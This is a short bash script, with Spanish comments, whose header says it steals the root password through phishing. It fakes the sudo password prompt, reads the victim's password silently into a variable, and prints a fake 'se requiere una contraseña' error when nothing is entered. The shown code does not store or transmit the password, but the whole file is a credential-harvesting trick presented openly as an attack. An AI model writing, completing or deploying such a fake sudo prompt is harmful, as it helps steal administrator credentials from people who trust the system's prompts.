#!/bin/bash

###################################
# Robar contraseña del root con   # 
# phishing                        #
###################################

read -sp "[sudo] Contraseña para `whoami`: " pw
if [ -z $pw ]; then
	echo
	echo -e "sudo: se requiere una contraseña"
fi
